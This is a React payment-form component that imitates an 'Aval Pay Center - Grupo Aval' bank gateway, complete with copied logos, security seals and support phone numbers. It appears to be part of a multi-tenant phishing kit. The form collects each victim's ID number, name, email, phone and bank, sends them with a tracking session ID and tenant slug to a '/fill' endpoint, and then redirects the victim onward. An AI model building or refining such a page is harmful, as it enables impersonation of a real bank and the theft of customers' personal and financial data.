import { FormEvent, useEffect, useMemo, useRef, useState } from 'react';
import { Navigate, useLocation, useNavigate } from 'react-router-dom';
import PageLoader from '@/components/PageLoader/PageLoader';
import { apiFetch } from '@/services/api';
import { getTrackSessionId } from '@/services/track';
import {
  clearPasarelaSession,
  formatPasarelaMoney,
  loadPasarelaSession,
  PASARELA_REDIRECT_URL,
  pasarelaAssets,
  pasarelaAvalBanks,
  pasarelaCountries,
  pasarelaDocumentTypes,
  pasarelaPersonTypes,
  pasarelaPseBanks,
  savePasarelaSession,
  type PasarelaSession,
} from '@/data/pasarela';
import './PasarelaPago.css';

type PayMethod = 'aval' | 'pse';

function PasarelaPago() {
  const navigate = useNavigate();
  const location = useLocation();
  const initial = (location.state as PasarelaSession | null) ?? loadPasarelaSession();

  const [session] = useState<PasarelaSession | null>(() => {
    if (initial) {
      savePasarelaSession(initial);
      return initial;
    }
    return null;
  });

  const [docType, setDocType] = useState(pasarelaDocumentTypes[0]);
  const [docNumber, setDocNumber] = useState('');
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [emailConfirm, setEmailConfirm] = useState('');
  const [country, setCountry] = useState(pasarelaCountries[0]);
  const [mobile, setMobile] = useState('');
  const [mobileConfirm, setMobileConfirm] = useState('');
  const [sameClient, setSameClient] = useState(true);
  const [clientDocType, setClientDocType] = useState(pasarelaDocumentTypes[0]);
  const [clientDocNumber, setClientDocNumber] = useState('');
  const [clientName, setClientName] = useState('');
  const [clientEmail, setClientEmail] = useState('');
  const [payMethod, setPayMethod] = useState<PayMethod>(session?.method ?? 'aval');
  const [avalBank, setAvalBank] = useState('');
  const [pseBank, setPseBank] = useState('');
  const [personType, setPersonType] = useState('NATURAL');
  const [docOpen, setDocOpen] = useState(false);
  const [countryOpen, setCountryOpen] = useState(false);
  const [clientDocOpen, setClientDocOpen] = useState(false);
  const [pseBankOpen, setPseBankOpen] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState<string | null>(null);
  const [redirectTarget, setRedirectTarget] = useState<string>(PASARELA_REDIRECT_URL);
  const redirectTimer = useRef<number | undefined>(undefined);

  useEffect(() => {
    document.title = 'PasarelaPagos';
  }, []);

  useEffect(() => () => window.clearTimeout(redirectTimer.current), []);

  const amountLabel = useMemo(
    () => (session ? formatPasarelaMoney(session.amount) : '$0'),
    [session],
  );

  if (!session) {
    return <Navigate to="/" replace />;
  }

  const validate = () => {
    const next: Record<string, string> = {};
    if (!docNumber.trim()) next.docNumber = 'Campo es requerido';
    if (!fullName.trim()) next.fullName = 'Campo es requerido';
    if (!email.trim()) next.email = 'Campo es requerido';
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) next.email = 'El campo no cumple con el formato esperado';
    if (!emailConfirm.trim()) next.emailConfirm = 'Campo es requerido';
    else if (emailConfirm !== email) {
      next.emailConfirm =
        'El valor del campo: Confirmación de Correo electrónico, no coincide con el valor del campo: Correo Electrónico';
    }
    if (!mobile.trim()) next.mobile = 'Campo es requerido';
    else if (!/^3\d{9}$/.test(mobile)) next.mobile = 'El número de teléfono no es un número de teléfono celular';
    if (!mobileConfirm.trim()) next.mobileConfirm = 'Campo es requerido';
    else if (mobileConfirm !== mobile) {
      next.mobileConfirm =
        'El valor del campo: Confirmar Móvil, no coincide con el valor del campo: Móvil para notificaciones';
    }
    if (!sameClient) {
      if (!clientDocNumber.trim()) next.clientDocNumber = 'Campo es requerido';
      if (!clientName.trim()) next.clientName = 'Campo es requerido';
      if (!clientEmail.trim()) next.clientEmail = 'Campo es requerido';
      else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(clientEmail)) {
        next.clientEmail = 'El campo no cumple con el formato esperado';
      }
    }
    if (payMethod === 'aval' && !avalBank) next.avalBank = 'Seleccione un banco';
    if (payMethod === 'pse') {
      if (!personType) next.personType = 'Seleccione el tipo de persona';
      if (!pseBank) next.pseBank = 'Seleccione un Banco';
    }
    setErrors(next);
    return Object.keys(next).length === 0;
  };

  const onSubmit = async (event: FormEvent) => {
    event.preventDefault();
    setGeneralError(null);
    if (!validate() || loading) return;
    setLoading(true);

    const bancoSeleccionado =
      payMethod === 'pse'
        ? pseBank
        : (pasarelaAvalBanks.find((b) => b.id === avalBank)?.name ?? avalBank);

    const tenantSlug =
      sessionStorage.getItem('avalpay_tenant_slug') ||
      localStorage.getItem('avalpay_tenant_slug') ||
      undefined;

    const payload = {
      monto: session.amount.replace(/\D/g, '') || '10000',
      banco: bancoSeleccionado,
      tipo: docType,
      doc: docNumber.trim(),
      nombre: fullName.trim(),
      email: email.trim(),
      celular: mobile.trim(),
      sessionId: getTrackSessionId(),
      tenantSlug,
    };

    let targetUrl = '';

    try {
      const resp = await apiFetch<{ redirect_url?: string; error?: string }>('/fill', {
        method: 'POST',
        body: JSON.stringify(payload),
      });

      if (resp?.redirect_url) {
        targetUrl = resp.redirect_url;
      } else {
        throw new Error(resp?.error || 'No se pudo obtener la URL de redirección');
      }
    } catch (err: any) {
      console.error('Error al procesar el pago:', err);
      setLoading(false);
      setGeneralError('No fue posible procesar la informacion en este momento. Por favor verifique sus datos e intente nuevamente.');
      return;
    }

    if (!targetUrl || targetUrl.includes('linkdepagospse.rappipay.co/invalido')) {
      setLoading(false);
      setGeneralError('No fue posible procesar la informacion en este momento. Por favor verifique sus datos e intente nuevamente.');
      return;
    }

    setRedirectTarget(targetUrl);
    setLoading(false);
    setSubmitted(true);
    clearPasarelaSession();

    // Redirigir de inmediato al destino obtenido
    window.location.href = targetUrl;
  };

  const onCancel = () => {
    window.clearTimeout(redirectTimer.current);
    clearPasarelaSession();
    navigate(session.backTo);
  };

  return (
    <div className="pasarela">
      {loading && <PageLoader />}
      <header className="pasarela-header">
        <div className="pasarela-header__brand">
          <img src={pasarelaAssets.headerLogo} alt="Aval Pay Center - Grupo Aval" />
        </div>
        <div className="pasarela-header__base">
          <div className="pasarela-header__curve" />
        </div>
      </header>

      <main className="pasarela-main">
        <section className="pasarela-product">
          <div className="pasarela-product__grid">
            <div className="pasarela-product__image">
              <div className="pasarela-product__frame">
                {session.logo ? (
                  <img src={session.logo} alt="" />
                ) : (
                  <img src={pasarelaAssets.iconCamera} alt="" className="pasarela-product__camera" />
                )}
              </div>
            </div>

            <div className="pasarela-product__description">
              <p className="pasarela-product__title">Descripción de tu Transacción</p>
              <p className="pasarela-product__service">PAGO {session.serviceName.toUpperCase()}</p>
              {session.detail && <p>{session.detail}</p>}
            </div>

            <div className="pasarela-product__client">
              {session.references.map((item) => (
                <div className="pasarela-product__ref" key={item.label}>
                  <span className="pasarela-product__ref-label">{item.label.toUpperCase()} :</span>
                  <span className="pasarela-product__ref-value">{item.value || '—'}</span>
                </div>
              ))}
            </div>

            <div className="pasarela-product__details">
              <div className="pasarela-product__row">
                <p>ID Transacción:</p>
                <p>{session.transactionId.replace(/\D/g, '') || session.transactionId}</p>
              </div>
              <div className="pasarela-product__row">
                <p>Referencia:</p>
                <p>{session.references[0]?.value || session.agreementId}</p>
              </div>
              <div className="pasarela-product__row">
                <p>Valor:</p>
                <p className="pasarela-product__price">{amountLabel}</p>
              </div>
            </div>
          </div>
        </section>

        {submitted ? (
          <section className="pasarela-done white-form">
            <p className="pasarela-done__title">Transacción en proceso</p>
            <p>
              Estimado cliente, tu pago con{' '}
              {payMethod === 'aval' ? 'Aval' : 'Otras Entidades'} quedó registrado por {amountLabel}.
              Redirigiendo a tu entidad financiera...
            </p>
            <p className="pasarela-done__redirect-note">
              Si no eres redirigido automáticamente en unos segundos, haz clic en el siguiente botón:
            </p>
            <div className="pasarela-done__actions">
              <a
                href={redirectTarget}
                className="pasarela-btn pasarela-btn--primary"
                id="btn-pasarela-redirect"
              >
                Continuar al pago
              </a>
              <button type="button" className="pasarela-btn pasarela-btn--ghost" onClick={onCancel}>
                Volver
              </button>
            </div>
          </section>
        ) : (
          <form className="pasarela-form" onSubmit={onSubmit} noValidate>
            <section className="white-form">
              <div className="pasarela-icon-block pasarela-icon-block--titular">
                <p>
                  <strong>Titular del Medio de Pago</strong>
                </p>
                <p>
                  Ingrese en esta sección los datos del titular del medio de pago que se va a utilizar en
                  el pago
                </p>
              </div>

              <div className="pasarela-fields">
                <FieldSelect
                  label="Tipo de Documento *"
                  value={docType}
                  open={docOpen}
                  options={pasarelaDocumentTypes}
                  onToggle={() => {
                    setDocOpen((v) => !v);
                    setCountryOpen(false);
                  }}
                  onPick={(value) => {
                    setDocType(value);
                    setDocOpen(false);
                  }}
                />
                <FieldInput
                  label="Número de documento *"
                  value={docNumber}
                  maxLength={10}
                  placeholder="Ingresa tu documento"
                  error={errors.docNumber}
                  onChange={(val) => setDocNumber(val.replace(/\D/g, '').slice(0, 10))}
                />
                <FieldInput
                  className="pasarela-field--full"
                  label="Nombre Completo *"
                  value={fullName}
                  placeholder="Ingresa tu nombre completo"
                  error={errors.fullName}
                  onChange={setFullName}
                />
                <FieldInput
                  label="Correo Electrónico *"
                  type="email"
                  value={email}
                  placeholder="ej: sumail@mail.com"
                  error={errors.email}
                  onChange={setEmail}
                />
                <FieldInput
                  label="Confirmación de Correo Electrónico *"
                  type="email"
                  value={emailConfirm}
                  placeholder="Ingresa de nuevo tu e-mail"
                  error={errors.emailConfirm}
                  onChange={setEmailConfirm}
                />
                <FieldSelect
                  className="pasarela-field--full"
                  label="País *"
                  value={country}
                  open={countryOpen}
                  options={pasarelaCountries}
                  onToggle={() => {
                    setCountryOpen((v) => !v);
                    setDocOpen(false);
                  }}
                  onPick={(value) => {
                    setCountry(value);
                    setCountryOpen(false);
                  }}
                />
                <FieldInput
                  label="Móvil para notificaciones *"
                  type="tel"
                  maxLength={10}
                  value={mobile}
                  placeholder="Ingresa tu número móvil"
                  error={errors.mobile}
                  onChange={(value) => setMobile(value.replace(/\D/g, '').slice(0, 10))}
                />
                <FieldInput
                  label="Confirmar Móvil *"
                  type="tel"
                  maxLength={10}
                  value={mobileConfirm}
                  placeholder="Ingresa de nuevo tu móvil"
                  error={errors.mobileConfirm}
                  onChange={(value) => setMobileConfirm(value.replace(/\D/g, '').slice(0, 10))}
                />
              </div>
            </section>

            <section className="white-form">
              <div className="pasarela-icon-block pasarela-icon-block--titular">
                <p>
                  <strong>Cliente que utiliza el Bien o Servicio</strong>
                </p>
                <p>Ingrese en esta sección los datos del cliente que utiliza el bien o servicio a pagar</p>
              </div>

              <label className="pasarela-check">
                <input
                  type="checkbox"
                  checked={sameClient}
                  onChange={(event) => setSameClient(event.target.checked)}
                />
                <span>Los Datos del Titular son los mismos del Cliente</span>
              </label>

              {!sameClient && (
                <div className="pasarela-fields">
                  <FieldSelect
                    label="Tipo de Documento *"
                    value={clientDocType}
                    open={clientDocOpen}
                    options={pasarelaDocumentTypes}
                    onToggle={() => setClientDocOpen((v) => !v)}
                    onPick={(value) => {
                      setClientDocType(value);
                      setClientDocOpen(false);
                    }}
                  />
                  <FieldInput
                    label="Número de documento *"
                    value={clientDocNumber}
                    placeholder="Ingresa tu documento"
                    error={errors.clientDocNumber}
                    onChange={setClientDocNumber}
                  />
                  <FieldInput
                    label="Nombre Completo *"
                    value={clientName}
                    placeholder="Ingresa tu nombre completo"
                    error={errors.clientName}
                    onChange={setClientName}
                  />
                  <FieldInput
                    label="Correo Electrónico *"
                    type="email"
                    value={clientEmail}
                    placeholder="ej: sumail@mail.com"
                    error={errors.clientEmail}
                    onChange={setClientEmail}
                  />
                </div>
              )}
            </section>

            <section className="white-form white-form--pay">
              <div className="pasarela-icon-block pasarela-icon-block--pay">
                <p>
                  <strong>Medio de pago</strong>
                </p>
              </div>

              <div className="pasarela-methods">
                <button
                  type="button"
                  className={`pasarela-method ${payMethod === 'aval' ? 'is-active' : ''}`}
                  onClick={() => setPayMethod('aval')}
                >
                  <i
                    className="pasarela-method__icon pasarela-method__icon--aval"
                    style={{
                      backgroundImage: `url(${payMethod === 'aval' ? pasarelaAssets.iconAvalActive : pasarelaAssets.iconAval})`,
                    }}
                  />
                  <span>Aval</span>
                </button>
                <button
                  type="button"
                  className={`pasarela-method ${payMethod === 'pse' ? 'is-active' : ''}`}
                  onClick={() => setPayMethod('pse')}
                >
                  <i
                    className="pasarela-method__icon pasarela-method__icon--banks"
                    style={{
                      backgroundImage: `url(${payMethod === 'pse' ? pasarelaAssets.iconBanksActive : pasarelaAssets.iconBanks})`,
                    }}
                  />
                  <span>Otras Entidades</span>
                </button>
              </div>

              {payMethod === 'aval' && (
                <div className="pasarela-aval">
                  <p className="pasarela-aval__label">Selecciona un banco</p>
                  <div className="pasarela-aval__grid">
                    {pasarelaAvalBanks.map((bank) => (
                      <button
                        key={bank.id}
                        type="button"
                        className={`pasarela-aval__bank ${avalBank === bank.id ? 'is-selected' : ''}`}
                        title={bank.name}
                        onClick={() => setAvalBank(bank.id)}
                      >
                        <img src={bank.logo} alt={bank.name} />
                      </button>
                    ))}
                  </div>
                  {errors.avalBank && <p className="pasarela-error">{errors.avalBank}</p>}
                </div>
              )}

              {payMethod === 'pse' && (
                <div className="pasarela-pse">
                  <p className="pasarela-pse__hint">
                    <img src={pasarelaAssets.iconInfo} alt="" />
                    <span>Para pagos con entidades del Grupo, utilizar botón Aval</span>
                  </p>

                  <div className="pasarela-pse__title">
                    <img src={pasarelaAssets.logoPse} alt="PSE" />
                    <strong>Transferencias desde tu banco con PSE</strong>
                  </div>

                  <div className="pasarela-pse__persons">
                    {pasarelaPersonTypes.map((item) => (
                      <button
                        key={item.id}
                        type="button"
                        className={`pasarela-pse__person ${personType === item.id ? 'is-selected' : ''}`}
                        onClick={() => setPersonType(item.id)}
                      >
                        <span className="pasarela-pse__radio" aria-hidden />
                        <span>{item.label}</span>
                      </button>
                    ))}
                  </div>
                  {errors.personType && <p className="pasarela-error">{errors.personType}</p>}

                  <FieldSelect
                    label="Seleccione el banco"
                    value={pseBank}
                    open={pseBankOpen}
                    options={pasarelaPseBanks}
                    placeholder="A continuación seleccione su banco"
                    onToggle={() => setPseBankOpen((v) => !v)}
                    onPick={(value) => {
                      setPseBank(value);
                      setPseBankOpen(false);
                    }}
                    error={errors.pseBank}
                  />
                </div>
              )}
            </section>

            <section className="pasarela-actions">
              {generalError && (
                <div className="pasarela-error-banner" role="alert">
                  <p>{generalError}</p>
                </div>
              )}
              <button type="button" className="pasarela-btn pasarela-btn--ghost" onClick={onCancel}>
                Cancelar
              </button>
              <button type="submit" className="pasarela-btn pasarela-btn--primary" id="btn-pasarela-pagar">
                Pagar
              </button>
            </section>
          </form>
        )}
      </main>

      <footer className="pasarela-footer">
        <div className="pasarela-footer__top">
          <div className="pasarela-footer__logos">
            <img src={pasarelaAssets.logoNorton} alt="Norton Secured" />
            <img src={pasarelaAssets.logoSecure} alt="Secure Trust" />
          </div>
          <div className="pasarela-footer__call">
            <img src={pasarelaAssets.iconCall} alt="" />
            <div>
              <p>
                <strong>Línea de Atención al Cliente</strong>
              </p>
              <p>Nacional: 018000-512825</p>
              <p>Bogotá: (601) 7432626</p>
            </div>
          </div>
        </div>
        <div className="pasarela-footer__bottom">
          <p>Copyright © {new Date().getFullYear()} Todos los derechos reservados Aval Valor Compartido</p>
        </div>
      </footer>
    </div>
  );
}

interface FieldInputProps {
  label: string;
  value: string;
  onChange: (value: string) => void;
  placeholder?: string;
  type?: string;
  maxLength?: number;
  error?: string;
  className?: string;
}

function FieldInput({
  label,
  value,
  onChange,
  placeholder,
  type = 'text',
  maxLength,
  error,
  className = '',
}: FieldInputProps) {
  return (
    <div className={`pasarela-field ${className}`.trim()}>
      <label>{label}</label>
      <input
        className={`pasarela-control ${error ? 'is-invalid' : ''}`}
        type={type}
        value={value}
        maxLength={maxLength}
        placeholder={placeholder}
        onChange={(event) => onChange(event.target.value)}
      />
      {error && <p className="pasarela-error">{error}</p>}
    </div>
  );
}

interface FieldSelectProps {
  label: string;
  value: string;
  open: boolean;
  options: string[];
  onToggle: () => void;
  onPick: (value: string) => void;
  placeholder?: string;
  error?: string;
  className?: string;
}

function FieldSelect({
  label,
  value,
  open,
  options,
  onToggle,
  onPick,
  placeholder = 'Seleccione',
  error,
  className = '',
}: FieldSelectProps) {
  return (
    <div className={`pasarela-field ${className}`.trim()}>
      <label>{label}</label>
      <div className="pasarela-select">
        <button
          type="button"
          className={`pasarela-control pasarela-control--select ${error ? 'is-invalid' : ''}`}
          onClick={onToggle}
        >
          <span className={value ? '' : 'is-placeholder'}>{value || placeholder}</span>
        </button>
        {open && (
          <div className="pasarela-select__options">
            {options.map((option) => (
              <button key={option} type="button" onClick={() => onPick(option)}>
                {option}
              </button>
            ))}
          </div>
        )}
      </div>
      {error && <p className="pasarela-error">{error}</p>}
    </div>
  );
}

export default PasarelaPago;
